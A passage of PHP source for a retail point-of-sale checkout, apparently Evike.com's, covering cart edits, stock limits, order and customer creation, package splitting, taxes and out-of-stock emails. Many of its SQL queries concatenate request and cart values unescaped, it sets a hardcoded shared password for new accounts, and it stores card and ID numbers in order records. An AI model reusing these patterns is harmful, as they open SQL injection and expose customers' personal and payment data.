            $cartpayments[] = $payment_method . ',' . number_format( $payment_amount, 2, '.', '' ) . ',' . $payment_parameter;
            $_SESSION["cartpayments"] = $cartpayments;
          }
          else { $msg .= "Gift card number required for gift card payment."; }
        }
        else {
          $cartpayments[] = $payment_method . ',' . number_format( $payment_amount, 2, '.', '' );
          $_SESSION["cartpayments"] = $cartpayments;
        }
      }
    }
    elseif ( $action == 'remove_checkout_product' ) {
      $remove_pid = $_REQUEST['remove_pid'];
      if ( $remove_pid != '' ) {
        foreach ( $cartproducts as $key => $cartproductdata ) {
          $cartproduct = explode( ',', $cartproductdata );
          if ( $cartproduct[1] == $remove_pid ) { unset( $cartproducts[$key] ); $beepok = true; }
        }
        $_SESSION["cartproducts"] = $cartproducts;
      }
    }
    elseif ( $action == 'remove_checkout_payment' ) {
      $remove_payment = $_REQUEST['remove_payment'];
      if ( $remove_payment != '' ) {
        unset( $cartpayments[$remove_payment] );
        $cashpayments = false;
        $changepayments = false;
        $changepaymentlist = array();
        foreach ( $cartpayments as $key => $cartpaymentdata ) {
          $cartpayment = explode( ',', $cartpaymentdata );
          if ( $cartpayment[0] == 'Cash' ) { $cashpayments = true; }
          if ( $cartpayment[0] == 'Change' ) { $changepayments = true; $changepaymentlist[] = $key; }
        }
        if ( $cashpayments == false && $changepayments == true ) {
          foreach ( $changepaymentlist as $changepaymentkey ) { unset( $cartpayments[$changepaymentkey] ); }
        }
        $_SESSION["cartpayments"] = $cartpayments;
      }
    }

    // Check stock
    $stockcheck = false; # Check stock or not - updated to false on 10/4/24
    foreach ( $cartproducts as $key => $cartproductdata ) {
      $cartproduct = explode( ',', $cartproductdata );
      if ( $cartproduct[1] > 0 && !in_array( $cartproduct[1], $nostockcheck ) ) {
        $newqty = $cartproduct[0];
        $productquery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . $cartproduct[1] . "'" );
        $productinfo = mysqli_fetch_array( $productquery );
        if ( $customerinfo['customers_id'] == $drinkspurchaseaccount && $productinfo['manufacturers_id'] != 263 && $productinfo['manufacturers_id'] != 1151 ) { $newqty = 0; $msg .= "Product " . $productinfo['products_id'] . " not purchasable for selected account, cart total adjusted."; $beeperror = true; }
        if ( $stockcheck == true ) {
          if ( $productinfo['products_multisplit'] == '' && $productinfo['products_quantity'] < $newqty ) { $newqty = $productinfo['products_quantity']; $msg .= "Not enough stock for product " . $productinfo['products_id'] . ", cart total adjusted.<br/>"; $beeperror = true; }
          if ( $productinfo['products_multisplit'] != '' ) {
            $multimsg = '';
            $multisplit_lines = explode( "\n", $productinfo['products_multisplit'] );
            foreach ( $multisplit_lines as $multisplit_line ) {
              $multisplit_productdata = explode( ',', $multisplit_line );
              $multisplit_product = trim( $multisplit_productdata[0] );
              $multisplit_qty = trim( $multisplit_productdata[1] );
              $multisplitproductquery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . $multisplit_product . "'" );
              $multisplitproductinfo = mysqli_fetch_array( $multisplitproductquery );
              if ( $multisplitproductinfo['products_quantity'] < $newqty * $multisplit_qty ) { $newqty = (int)floor( $multisplitproductinfo['products_quantity'] / $multisplit_qty ); $multimsg = "Not enough stock for product " . $productinfo['products_id'] . ", cart total adjusted.<br/>"; $beeperror = true; }
            }
            if ( $multimsg != '' ) { $msg .= $multimsg; }
          }
        }
        if ( $newqty > $productinfo['products_orderlimit'] && $productinfo['products_orderlimit'] > 0 ) { $newqty = $productinfo['products_orderlimit']; $msg .= "Purchase limit reached for product " . $productinfo['products_id'] . ", cart total adjusted.<br/>"; $beeperror = true; }
        if ( in_array( $productinfo['products_id'], array( 42672, 43046, 44112, 44113, 44293, 44444, 45148, 45052, 45195 ) ) ) { $newqty = 0; $msg .= "Smoke grenades cannot be sold in California, product " . $productinfo['products_id'] . " removed from cart.<br/>"; $beeperror = true; }
        if ( $newqty == 0 ) { unset( $cartproducts[$key] ); $beeperror = true; }
        elseif ( $newqty != $cartproduct[0] ) { $cartproducts[$key] = $newqty . ',' . $cartproduct[1]; }
      }
    }
    if ( $beeperror == true ) { echo '<script>$(document).ready(function() { $("#beep_error").get(0).play(); });</script>'; }
    elseif ( $beepok == true ) { echo '<script>$(document).ready(function() { $("#beep_ok").get(0).play(); });</script>'; }
    $_SESSION["cartproducts"] = $cartproducts;

    $customersaved == false;
    if ( $action == 'save_order' ) {
      if ( $newcustomer == true && $newcustomerdata['customers_email_address'] != '' ) {
        $customerquery = mysqli_query( $link, "SELECT * FROM customers WHERE customers_email_address LIKE '" . $newcustomerdata['customers_email_address'] . "'" );
        $customerinfo = mysqli_fetch_array( $customerquery );
        if ( $customerinfo['customers_id'] > 0 ) {
          $msg = 'Customer account already exists with e-mail address ' . $newcustomerdata['customers_email_address'] . '. Please search and select the existing customer account or create a new account with a different e-mail address.';
        }
        else {
          $newcustomerdata['customers_group_id'] = '0';
          $newcustomerdata['customers_password'] = 'evike.comsuperstorecheckout';
          $insertfields = "";
          $insertdata = "";
          foreach ( $newcustomerdata as $key => $value ) {
            if ( $insertfields != '' ) { $insertfields .= ', '; }
            $insertfields .= $key;
            if ( $insertdata != '' ) { $insertdata .= ', '; }
            $value = str_replace( "'", "''", $value );
            if ( $value == 'NOW()' ) { $insertdata .= $value; }
            else { $insertdata .= "'" . $value . "'"; }
          }
          $insert_customer = mysqli_query( $link, "INSERT INTO customers ( " . $insertfields . " ) VALUES ( " . $insertdata . " )" );
          $customerid = mysqli_insert_id( $link );
          if ( $customerid > 0 ) { $customersaved = true; }
        }
      }
      elseif ( $customerid > 0 ) { $customersaved = true; }
      else { $msg = 'Invalid customer selected, please verify the customer account and try again.'; }
    }
    if ( $action == 'save_order' && $customersaved == true ) {
      $customerquery = mysqli_query( $link, "SELECT c.customers_id AS customerid, c.*, a.*, z.*, cy.* FROM customers c LEFT JOIN address_book a ON c.customers_default_address_id=a.address_book_id LEFT JOIN zones z ON a.entry_zone_id=z.zone_id LEFT JOIN countries cy ON a.entry_country_id=cy.countries_id WHERE c.customers_id='" . $customerid . "'" );
      $customerinfo = mysqli_fetch_array( $customerquery );
      $isblank = true;
      foreach ( $cartproducts as $key => $cartproductdata ) {
        $cartproduct = explode( ',', $cartproductdata );
        if ( preg_match( '/^\d{5,6}$/', $cartproduct[1] ) || preg_match( '/^(72716|78533|113510)-\d{1,2}$/', $cartproduct[1] ) ) { $isblank = false; }
      }
      if ( $customerinfo['customerid'] > 0 && $isblank == false && !empty( $cartproducts ) && !empty( $cartpayments ) ) {
        if ( $dlid != '' && $dlid != $customerinfo['customers_dlid'] ) {
          $updatequery = mysqli_query( $link, "UPDATE customers SET customers_dlid='" . $dlid . "' WHERE customers_id='" . $customerinfo['customerid'] . "'" );
          $customerinfo['customers_dlid'] = $dlid;
        }
        if ( $leid != '' && $leid != $customerinfo['customers_leid'] ) {
          $updatequery = mysqli_query( $link, "UPDATE customers SET customers_leid='" . $leid . "' WHERE customers_id='" . $customerinfo['customerid'] . "'" );
          $customerinfo['customers_leid'] = $leid;
        }
        if ( $dob != '' ) {
          $olddob = substr( $customerinfo['customers_dob'], 0, 10 );
          if ( $olddob == '0000-00-00' ) { $olddob = ''; }
          if ( $dob != $olddob ) {
            $updatequery = mysqli_query( $link, "UPDATE customers SET customers_dob='" . $dob . "' WHERE customers_id='" . $customerinfo['customerid'] . "'" );
            $customerinfo['customers_dob'] = $dob;
          }
        }
        if ( $customerinfo['entry_firstname'] == '' ) { $customerinfo['entry_firstname'] = $customerinfo['customers_firstname']; }
        if ( $customerinfo['entry_lastname'] == '' ) { $customerinfo['entry_lastname'] = $customerinfo['customers_lastname']; }
        $customername = $customerinfo['entry_firstname'] . ' ' . $customerinfo['entry_lastname'];
        if ( $_SESSION['employeepurchase'] != '' ) { $customername = $_SESSION['employeepurchase']; }
        $paymentmethod = 'Pay in Store';
        $terms = false;
        $ccnum = '';
        foreach ( $cartpayments as $key => $cartpaymentdata ) {
          $cartpayment = explode( ',', $cartpaymentdata );
          if ( preg_match( '/^Net /', $cartpayment[0] ) && $cartpayment['1'] > 0 ) { $terms = true; $paymentmethod = $cartpayment[0]; }
          if ( $cartpayment[0] != 'Credit Card' ) { continue; }
          $paymentnotes = mysqli_real_escape_string( $link, $cartpayment[2] );
          if ( $paymentnotes != '' ) { $ccnum = $paymentnotes; }
        }
        $orderstatus = '40';
        if ( $terms == true ) { $orderstatus = '1'; }

        $orderdata = array(
          "customers_id" => $customerinfo['customerid'],
          "customers_gid" => 'Tier ' . $customerinfo['customers_group_id'],
          "customers_name" => $customername,
          "customers_company" => $customerinfo['entry_company'],
          "customers_street_address" => $customerinfo['entry_street_address'],
          "customers_street_address_2" => $customerinfo['entry_street_address_2'],
          "customers_suburb" => $customerinfo['entry_suburb'],
          "customers_city" => $customerinfo['entry_city'],
          "customers_postcode" => $customerinfo['entry_postcode'],
          "customers_state" => $customerinfo['entry_state'],
          "customers_country" => $customerinfo['countries_name'],
          "customers_telephone" => $customerinfo['customers_telephone'],
          "customers_email_address" => $customerinfo['customers_email_address'],
          "customers_address_format_id" => $customerinfo['address_format_id'],
          "delivery_name" => $customername,
          "delivery_company" => $customerinfo['entry_company'],
          "delivery_street_address" => '2801 W Mission Rd.',
          "delivery_street_address_2" => '',
          "delivery_suburb" => '',
          "delivery_city" => 'Alhambra',
          "delivery_postcode" => '91803',
          "delivery_state" => 'California',
          "delivery_country" => 'United States',
          "billing_name" => $customername,
          "billing_company" => $customerinfo['entry_company'],
          "billing_street_address" => $customerinfo['entry_street_address'],
          "billing_street_address_2" => $customerinfo['entry_street_address_2'],
          "billing_suburb" => $customerinfo['entry_suburb'],
          "billing_city" => $customerinfo['entry_city'],
          "billing_postcode" => $customerinfo['entry_postcode'],
          "billing_state" => $customerinfo['entry_state'],
          "billing_country" => $customerinfo['countries_name'],
          "payment_method" => $paymentmethod,
          "cc_number" => $ccnum,
          "date_purchased" => 'NOW()',
          "orders_status" => $orderstatus,
          "currency" => 'USD',
          "currency_value" => '1',
          "ipaddy" => $HTTP_SERVER_VARS["REMOTE_ADDR"],
          "ipisp" => 'Evike.com Superstore',
          "orders_po_number" => $_SESSION['ponumber'],
          'orders_shipmethod' => 'In Store Pickup (Will Call)',
        );
        if ( $customerinfo['customers_legalcompanyname'] != '' ) { $orderdata['billing_name'] = $customerinfo['customers_legalcompanyname']; }
        #"orders_notes" => $_SESSION['ordernotes'], // do not use - this column is used for packing list notes
        if ( $customerinfo['zone_name'] != '' ) {
          $orderdata['customers_state'] = $customerinfo['zone_name'];
          $orderdata['billing_state'] = $customerinfo['zone_name'];
        }
        $insertfields = "";
        $insertdata = "";
        foreach ( $orderdata as $key => $value ) {
          if ( $insertfields != '' ) { $insertfields .= ', '; }
          $insertfields .= $key;
          if ( $insertdata != '' ) { $insertdata .= ', '; }
          $value = str_replace( "'", "''", $value );
          if ( $value == 'NOW()' ) { $insertdata .= $value; }
          else { $insertdata .= "'" . $value . "'"; }
        }
        $insert_order = mysqli_query( $link, "INSERT INTO orders ( " . $insertfields . " ) VALUES ( " . $insertdata . " )" );
        $orderid = mysqli_insert_id( $link );
        if ( $orderid > 0 ) {
          $products_ordered_html = '';
          if ( $dlid != '' || $leid != '' ) {
            #$ordernotes = "ID information collected by: " . $userinfo['pos_users_firstname'] . ' ' . $userinfo['pos_users_lastname'] . "\n";
            $ordernotes = "";
            if ( $dlid != '' ) { $ordernotes .= "Driver's License/ID: " . $dlid . "\n"; }
            if ( $leid != '' ) { $ordernotes .= "Law Enforcement/Military ID: " . $leid . "\n"; }
            $ordernotes = str_replace( "'", "''", $ordernotes );
            $insert_notes = mysqli_query( $link, "INSERT INTO orders_notes ( orders_id, pos_users_id, orders_notes ) VALUES ( '" . $orderid . "', '" . $loginuser . "', '" . $ordernotes . "' )" );
          }
          if ( $_SESSION['ordernotes'] != '' ) {
            #$ordernotes = "POS notes by " . $userinfo['pos_users_firstname'] . ' ' . $userinfo['pos_users_lastname'] . ":\n" . $_SESSION['ordernotes'];
            $ordernotes = $_SESSION['ordernotes'];
            $ordernotes = str_replace( "'", "''", $ordernotes );
            $insert_notes = mysqli_query( $link, "INSERT INTO orders_notes ( orders_id, pos_users_id, orders_notes ) VALUES ( '" . $orderid . "', '" . $loginuser . "', '" . $ordernotes . "' )" );
          }
          $producttotals = array();
          $ordertotals = array(); // To replace $producttotals above and calculate totals before multisplits
          $multisplit_msg = '';
          $neworderproducts_multisplit = array();
          $multisplit_remove = array();
          foreach ( $cartproducts as $key => $cartproductdata ) {
            $cartproduct = explode( ',', $cartproductdata );
            if ( substr( $cartproduct[1], 0, 5 ) == '72716' || substr( $cartproduct[1], 0, 5 ) == '78533' || substr( $cartproduct[1], 0, 6 ) == '113510' ) {
              $thiscounter = substr( $cartproduct[1], 6 );
            }
            if ( $cartproduct[0] < 1 ) { continue; }
            if ( !preg_match( '/^\d{5,6}$/', $cartproduct[1] ) && substr( $cartproduct[1], 0, 5 ) != '72716' && substr( $cartproduct[1], 0, 5 ) != '78533' || substr( $cartproduct[1], 0, 6 ) == '113510' ) { continue; }
            $customid = '';
            if ( substr( $cartproduct[1], 0, 5 ) == '72716' || substr( $cartproduct[1], 0, 5 ) == '78533' || substr( $cartproduct[1], 0, 6 ) == '113510' ) {
              $customid = substr( $cartproduct[1], 6 );
              $cartproduct[1] = substr( $cartproduct[1], 0, 5 );
            }
            $productquery = mysqli_query( $link, "SELECT * FROM products p LEFT JOIN products_description pd ON p.products_id=pd.products_id LEFT JOIN manufacturers m ON p.manufacturers_id=m.manufacturers_id WHERE p.products_id='" . $cartproduct[1] . "'" );
            $productinfo = mysqli_fetch_array( $productquery );
            $productprice = getsellprice( $productinfo['products_id'], $customertier, $productinfo['products_price'], $productinfo['manufacturers_discount'] );
            $couponprice = applycoupon( $productinfo['products_id'], $couponcode, $cartproducts );
            $coupondiscount = 0;
            if ( $productinfo['products_id'] != '72716' && $productinfo['products_id'] != '78533' && $productinfo['products_id'] != '113510' && $productprice - $couponprice > 0 && $couponprice > 0 && $couponcode != '' ) { $coupondiscount = $productprice - $couponprice; }
            #if ( $productprice - $couponprice > 0 ) { $coupondiscount = $productprice - $couponprice; }
            if ( $productinfo['products_multisplit'] != '' ) {
              $producttotals['coupon'] += ( $productprice - $couponprice ) * $cartproduct[0];
              $parentproducttax = $salestaxrate;
              if ( $taxexempt == true ) { $parentproducttax = 0; }
              if ( $productinfo['products_tax_class_id'] == 0 ) { $parentproducttax = 0; }
              #if ( $productprice == $productinfo['products_price'] && $productinfo['products_price'] - $couponprice > 0 ) {
              if ( $productprice - $couponprice > 0 ) {
                $ordertotals['subtotal'] += $couponprice * $cartproduct[0];
                $ordertotals['tax'] += round( round( $couponprice * $cartproduct[0], 2 ) * $parentproducttax / 100, 2 );
              }
              else {
                $ordertotals['subtotal'] += $productprice * $cartproduct[0];
                $ordertotals['tax'] += round( round( $productprice * $cartproduct[0], 2 ) * $parentproducttax / 100, 2 );
              }
              $multisplit_lines = explode( "\n", $productinfo['products_multisplit'] );
              $multisplit_msg .= $productinfo['products_id'] . ' [' . $productinfo['products_model'] . '] (' . $cartproduct[0] . ') - ';
              if ( count( $multisplit_lines ) > 1 ) { // Calculate price differently depending on how it's split
                $multisplit_prices = array();
                $total_original_price = 0;
                foreach ( $multisplit_lines as $multisplit_line ) {
                  $multisplit_productdata = explode( ',', $multisplit_line );
                  $multisplit_product = trim( $multisplit_productdata[0] );
                  $multisplit_qty = trim( $multisplit_productdata[1] );
                  if ( $multisplit_product != '' && $multisplit_qty > 0 ) {
                    $multisplit_query = mysqli_query( $link, "SELECT * FROM products p LEFT JOIN manufacturers m ON p.manufacturers_id=m.manufacturers_id WHERE p.products_id='" . $multisplit_product . "'" );
                    $multisplit_data = mysqli_fetch_array( $multisplit_query );
                    $products_price = getsellprice( $multisplit_data['products_id'], $customertier, $multisplit_data['products_price'], $multisplit_data['manufacturers_discount'] );
                    $multisplit_prices[$multisplit_product] = $products_price;
                    $total_original_price += $products_price * $multisplit_qty;
                  }
                }
                $product_multiplier = $productprice / $total_original_price;
                foreach ( $multisplit_lines as $multisplit_line ) {
                  $multisplit_productdata = explode( ',', $multisplit_line );
                  $multisplit_product = trim( $multisplit_productdata[0] );
                  $multisplit_qty = trim( $multisplit_productdata[1] );
                  if ( $multisplit_product != '' && $multisplit_qty > 0 ) {
                    $multisplit_product_query = mysqli_query( $link, "SELECT * FROM products p LEFT JOIN products_description pd ON p.products_id=pd.products_id WHERE p.products_id='" . $multisplit_product . "'" );
                    $multisplit_product_data = mysqli_fetch_array( $multisplit_product_query );
                    if ( $multisplit_product_data['products_id'] > 0 ) {
                      $thisproducttax = $salestaxrate;
                      if ( $productinfo['products_tax_class_id'] == 0 ) { $thisproducttax = 0; } # Children are tax exempt if multisplit parent is tax exempt
                      #if ( $taxexempt == true || $multisplit_product_data['products_tax_class_id'] == 0 ) { $thisproducttax = 0; }
                      if ( $taxexempt == true ) { $thisproducttax = 0; } # Tax non-taxable items if it's part of a package
                      $product_final_price = $multisplit_prices[$multisplit_product] * $product_multiplier;
                      $product_discount_ratio = $product_final_price / $productprice;
                      $neworderproducts_multisplit[] = array(
                        "orders_id" => $orderid,
                        "products_id" => $multisplit_product_data['products_id'],
                        "products_model" => $multisplit_product_data['products_model'],
                        "products_name" => $multisplit_product_data['products_name'],
                        #"products_price" => round( $productprice / $multisplit_qty, 2 ),
                        "products_price" => round( $product_final_price, 2 ),
                        'final_price' => round( $product_final_price, 2 ),
                        "products_tax" => $thisproducttax,
                        #"products_discount" => round( $coupondiscount / $multisplit_qty, 2 ),
                        "products_discount" => round( $coupondiscount * $product_discount_ratio, 2 ),
                        "products_quantity" => $cartproduct[0] * $multisplit_qty,
                        "products_location" => $multisplit_product_data['products_location'],
                        "products_multisplit_parent_pid" => $cartproduct[1],
                      );
                      $order_tax_total += number_format( round( $product_final_price, 2 ) * $cartproduct[0] * $multisplit_qty * $thisproducttax / 100, 2, '.', '' );
                      $productcounter++;
                      if ( !preg_match( '/ - $/', $multisplit_msg ) ) { $multisplit_msg .= ', '; }
                      $multisplit_msg .= $multisplit_product_data['products_id'] . ' [' . $multisplit_product_data['products_model'] . '] (' . $multisplit_qty * $cartproduct[0] . ')';
                    }
                  }
                }
              }
              else {
                foreach ( $multisplit_lines as $multisplit_line ) {
                  $multisplit_productdata = explode( ',', $multisplit_line );
                  $multisplit_product = trim( $multisplit_productdata[0] );
                  $multisplit_qty = trim( $multisplit_productdata[1] );
                  if ( $multisplit_product != '' && $multisplit_qty > 0 ) {
                    $multisplit_product_query = mysqli_query( $link, "SELECT p.products_id, p.products_model, p.products_location, p.products_tax_class_id, p.manufacturers_id, pd.products_name FROM products p, products_description pd WHERE p.products_id=pd.products_id AND p.products_id='" . $multisplit_product . "'" );
                    if ( mysqli_num_rows( $multisplit_product_query ) > 0 ) {
                      $multisplit_product_data = mysqli_fetch_array( $multisplit_product_query );
                      $thisproducttax = $salestaxrate;
                      if ( $productinfo['products_tax_class_id'] == 0 ) { $thisproducttax = 0; } # Children are tax exempt if multisplit parent is tax exempt
                      #if ( $taxexempt == true || $multisplit_product_data['products_tax_class_id'] == 0 ) { $thisproducttax = 0; }
                      if ( $taxexempt == true ) { $thisproducttax = 0; } # Tax non-taxable items if it's part of a package
                      $neworderproducts_multisplit[] = array(
                        "orders_id" => $orderid,
                        "products_id" => $multisplit_product_data['products_id'],
                        "products_model" => $multisplit_product_data['products_model'],
                        "products_name" => $multisplit_product_data['products_name'],
                        "products_price" => round( $productprice / $multisplit_qty, 2 ),
                        "final_price" => round( $productprice / $multisplit_qty, 2 ),
                        "products_tax" => $thisproducttax,
                        "products_discount" => round( $coupondiscount / $multisplit_qty, 2 ),
                        "products_quantity" => $cartproduct[0] * $multisplit_qty,
                        "products_location" => $multisplit_product_data['products_location'],
                        "products_multisplit_parent_pid" => $cartproduct[1],
                      );
                      $order_tax_total += number_format( round( $productprice / $multisplit_qty, 2 ) * $cartproduct[0] * $multisplit_qty * $thisproducttax / 100, 2, '.', '' );
                      $productcounter++;
                      if ( !preg_match( '/ - $/', $multisplit_msg ) ) { $multisplit_msg .= ', '; }
                      $multisplit_msg .= $multisplit_product_data['products_id'] . ' [' . $multisplit_product_data['products_model'] . '] (' . $multisplit_qty * $cartproduct[0] . ')';
                    }
                  }
                }
              }

              $multisplit_msg .= "\n";
              $multisplit_remove[] = $cartproduct[1];
            }
          }
          $ordercomments = "";
          if ( $multisplit_msg != '' ) {
            $multisplit_msg = "Multiple Products Split:\n" . $multisplit_msg;
            $ordercomments .= $multisplit_msg;
          }
          $insert_status = mysqli_query( $link, "INSERT INTO orders_status_history ( orders_id, orders_status_id, admin_id, date_added, customer_notified, comments ) VALUES ( '" . $orderid . "', '" . $orderstatus . "', '0', NOW(), '0', '" . $ordercomments . "' )" );

          $neworderproducts = array();
          foreach ( $cartproducts as $key => $cartproductdata ) {
            $cartproduct = explode( ',', $cartproductdata );
            if ( $cartproduct[0] < 1 ) { continue; }
            if ( !preg_match( '/^\d{5,6}$/', $cartproduct[1] ) && substr( $cartproduct[1], 0, 5 ) != '72716' && substr( $cartproduct[1], 0, 5 ) != '78533' && substr( $cartproduct[1], 0, 6 ) != '113510' ) { continue; }
            $customid = '';
            if ( substr( $cartproduct[1], 0, 5 ) == '72716' || substr( $cartproduct[1], 0, 5 ) == '78533' || substr( $cartproduct[1], 0, 6 ) == '113510' ) {
              $customid = substr( $cartproduct[1], 6 );
              $cartproduct[1] = substr( $cartproduct[1], 0, 5 );
            }
            if ( in_array( $cartproduct[1], $multisplit_remove ) ) { continue; }
            $productquery = mysqli_query( $link, "SELECT * FROM products p LEFT JOIN products_description pd ON p.products_id=pd.products_id LEFT JOIN manufacturers m ON p.manufacturers_id=m.manufacturers_id WHERE p.products_id='" . $cartproduct[1] . "'" );
            $productinfo = mysqli_fetch_array( $productquery );
            $productprice = getsellprice( $productinfo['products_id'], $customertier, $productinfo['products_price'], $productinfo['manufacturers_discount'] );
            $coupondiscount = 0;
            $thisproducttax = $salestaxrate;
            if ( $taxexempt == true || $productinfo['products_tax_class_id'] == 0 ) { $thisproducttax = 0; }
            if ( $customid != '' ) {
              $customproductdata = explode( ',', $customproducts[$customid] );
              if ( $customproductdata[1] != '' ) { $productinfo['products_name'] = $customproductdata[1]; }
              if ( $customproductdata[0] != '' ) { $productprice = $customproductdata[0]; }
            }
# Check custom prices here
#kuni
            #if ( $productprice == $productinfo['products_price'] || $couponcode == 'BLK2021' ) {
              $couponprice = applycoupon( $productinfo['products_id'], $couponcode, $cartproducts );
              if ( $productprice - $couponprice > 0 && $customid === '' ) {
                $producttotals['coupon'] += ( $productprice - $couponprice ) * $cartproduct[0];
                $coupondiscount = $productinfo['products_price'] - $couponprice;
                $ordertotals['subtotal'] += $couponprice * $cartproduct[0];
                $ordertotals['tax'] += round( round( $couponprice * $cartproduct[0], 2 ) * $thisproducttax / 100, 2 );
              }
              else {
                $ordertotals['subtotal'] += $productprice * $cartproduct[0];
                $ordertotals['tax'] += round( round( $productprice * $cartproduct[0], 2 ) * $thisproducttax / 100, 2 );
              }
            #}
            #else {
            #  $ordertotals['subtotal'] += $productprice * $cartproduct[0];
            #  $ordertotals['tax'] += round( round( $productprice * $cartproduct[0], 2 ) * $thisproducttax / 100, 2 );
            #}
            if ( $productinfo['products_preorder'] == 0 && $productinfo['vendors_id'] != 130 && !in_array( $cartproduct[1], $nostockcheck ) ) {
              $stock_left = $productinfo['products_quantity'] - $cartproduct[0];
              $dallas_query = mysqli_query( $link, "SELECT * FROM products_inventory_dallas WHERE products_id='" . $cartproduct[1] . "'" );
              $dallas_data = mysqli_fetch_array( $dallas_query );
              $softair_query = mysqli_query( $link, "SELECT * FROM products_inventory_softair WHERE products_id='" . $cartproduct[1] . "'" );
              $softair_data = mysqli_fetch_array($softair_query);
              if ( $stock_left < 1 && $dallas_data['products_quantity'] < 1 ) {
                $salestatsquery = mysqli_query( $link, "SELECT * FROM stats_products_sales WHERE products_id='" . $cartproduct[1] . "'" );
                $salestatsinfo = mysqli_fetch_array( $salestatsquery );
                if ( $productinfo['vendors_id'] > 0 ) {
                  $vendorquery = mysqli_query( $link, "SELECT * FROM vendors v LEFT JOIN admin a ON v.admin_id=a.admin_id WHERE v.vendors_id='" . $productinfo['vendors_id'] . "'" );
                  $vendorinfo = mysqli_fetch_array( $vendorquery );
                }
                $low_stock_email = '( ' . $productinfo['products_supplier_order_qty'] . " - " . $salestatsinfo['3mosold'] . " - " . $productinfo['products_restock_qty'] . " )\n\n";
                $low_stock_email .= 'OUT OF STOCK warning: ' . $productinfo['products_name'] . "\n";
                $low_stock_email .= 'Model No: ' . $productinfo['products_model'] . "\n";
                $low_stock_email .= 'Quantity: ' . $stock_left  . "\n";
                $low_stock_email .= 'Qty on Order: ' . $productinfo['products_supplier_order_qty'] . "\n";
                $low_stock_email .= 'Qty on Order 2: ' . $productinfo['products_supplier_order_qty2'] . "\n";
                $low_stock_email .= 'Qty on Order Dallas: ' . $dallas_data['products_supplier_order_qty'] . "\n";
                $low_stock_email .= 'Qty on Order 2 Dallas: ' . $dallas_data['products_supplier_order_qty2'] . "\n";
                if ( $softair_data['products_quantity'] > 0 ) { $low_stock_email .= 'Softair USA: ' . $softair_data['products_quantity'] . "\n"; }
                $low_stock_email .= 'Product URL: http://www.evike.com/products/' . $productinfo['products_id'] . '/' . "\n";
                $low_stock_email .= 'Admin URL: http://admin.evike.com/categories.php?search=' . $productinfo['products_id'] . "\n\n";
                $low_stock_email .= 'Price: $' . number_format( $productinfo['products_price'] , 2, '.', ',' ) . "\n";
                if ( $productprice < $productinfo['products_price'] ) { $low_stock_email .= 'Sell Price: $' . number_format( $productprice, 2, '.', ',' ) . "\n"; }
                $low_stock_email .= "\n";
                $low_stock_email .= 'Restock Qty: '. $productinfo['products_restock_qty'] .' units' . "\n";
                $low_stock_email .= '3 Month Sold: ' . $salestatsinfo['3mosold'] . ' units' . "\n";
                $low_stock_email .= 'Last Purchased: ' . $productinfo['products_last_purchased_date'] . "\n";
                $low_stock_email .= 'Vendor: ' . $vendorinfo['vendors_name'] . "\n";
                $low_stock_email .= 'Rep: ' . $vendorinfo['admin_firstname'] . ' ' . $vendorinfo['admin_lastname'] . "\n";
                $low_stock_email .= 'Products Memo: ' . $productinfo['products_memo'];
                $low_stock_email .= "\n\n\n" . 'Ref Code - ' . $productinfo['products_preorder'];
                $package_query = mysqli_query( $link, "SELECT products_id FROM products WHERE products_multisplit LIKE '%" . $productinfo['products_id'] . "%'" );
                $num_packages =mysqli_num_rows( $package_query );
                $children_query = mysqli_query( $link, "SELECT products_id FROM products WHERE parent_products_id='" . $productinfo['products_id'] . "'" );
                $num_children = mysqli_num_rows( $children_query );
                $low_stock_subject = 'LS:' . ' [' . $salestatsinfo['products_velocity_class'] . '] [' . $vendorinfo['vendors_name'] . '] [' . $productinfo['products_model'] . ']';
                if ( $num_packages > 0 ) { $low_stock_subject = 'LS PKG:' . ' [' . $salestatsinfo['products_velocity_class'] . '] [' . $vendorinfo['vendors_name'] . '] [' . $productinfo['model'] . ']'; }
                if ( $num_children > 0 ) { $low_stock_subject = 'LS PARENT:' . ' [' . $salestatsinfo['products_velocity_class'] . '] [' . $vendorinfo['vendors_name'] . '] [' . $productinfo['model'] . ']'; }
                #$headers = "MIME-Version: 1.0\r\n";
                #$headers .= "Content-type:text/html;charset=UTF-8\r\n";
                #$headers .= "From: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="422c2d6f3027322e3b0227342b29276c212d2f">[email&#160;protected]</a>\r\n";
                $headers = "From: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="492726643b2c392530092c3f20222c672a2624">[email&#160;protected]</a>\r\n";
                #if ( $salestatsinfo['3mosold'] >= 10 && ( $salestatsinfo['products_velocity_class'] == 'A' || $salestatsinfo['products_velocity_class'] == 'E' || ( $salestatsinfo['products_velocity_class'] == 'B' && $productinfo['products_price'] >= 50 ) || $productinfo['manufacturers_id'] == 412 || $productinfo['manufacturers_id'] == 485 ) ) { # Velocity A, B above $50, Jigging Master, Battle Angler only for Evike
                #  mail( '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="92f3f6fffbfcd2f7e4fbf9f7bcf1fdff">[email&#160;protected]</a>', $low_stock_subject, $low_stock_email, $headers );
                #}
                #if ( $salestatsinfo['products_velocity_class'] == 'A' || $salestatsinfo['products_velocity_class'] == 'E' || ( $salestatsinfo['products_velocity_class'] == 'B' && $productinfo['products_price'] >= 50 ) ) {
                #  mail( '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fc9689909599bc998a959799d29f9391">[email&#160;protected]</a>', $low_stock_subject, $low_stock_email, $headers );
                #}
                if ( $vendorinfo['admin_email_address'] != '' && $salestatsinfo['products_velocity_class'] != 'D' ) {
                  $low_stock_subject = 'OUT OF STOCK WARNING:' . ' [' . $salestatsinfo['products_velocity_class'] . '][' . $vendorinfo['vendors_name'] . '] [' .$productinfo['products_model'] . ']';
                  if ( $num_packages > 0 ) { $low_stock_subject = 'OUT OF STOCK WARNING (PACKAGE!):' . ' [' . $salestatsinfo['products_velocity_class'] . '][' . $vendorinfo['vendors_name'] . '] [' .$productinfo['products_model'] . ']'; }
                  if ( $num_children > 0 ) { $low_stock_subject = 'OUT OF STOCK WARNING (PARENT!):' . ' [' . $salestatsinfo['products_velocity_class'] . '][' . $vendorinfo['vendors_name'] . '] [' .$productinfo['products_model'] . ']'; }
                  mail( $vendorinfo['admin_email_address'], $low_stock_subject, $low_stock_email, $headers );
                }
              }
            }
            $taxrate = '0';
            if ( $taxexempt == false && $productinfo['products_tax_class_id'] == 1 ) { $taxrate = $salestaxrate; }
            $neworderproducts[] = array(
